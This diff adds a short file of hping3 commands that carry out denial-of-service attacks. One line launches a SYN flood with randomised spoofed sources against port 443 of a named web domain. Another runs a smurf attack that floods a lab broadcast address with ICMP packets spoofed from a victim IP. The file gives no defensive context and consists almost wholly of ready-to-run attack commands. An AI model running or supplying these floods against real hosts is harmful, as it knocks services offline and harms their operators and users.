@@ -1,0 +1,8 @@
+sudo apt install hping3
+
+#SYN-FLOOD attacks
+
+ hping3 --count 15000 --data 120 --syn --win 64 -p 443 --flood --rand-source www.ewubdserver.com
+
+#Dos smurf attack
+sudo hping3 --icmp --count 50000 --spoof 192.168.56.5 192.168.56.255 --flood
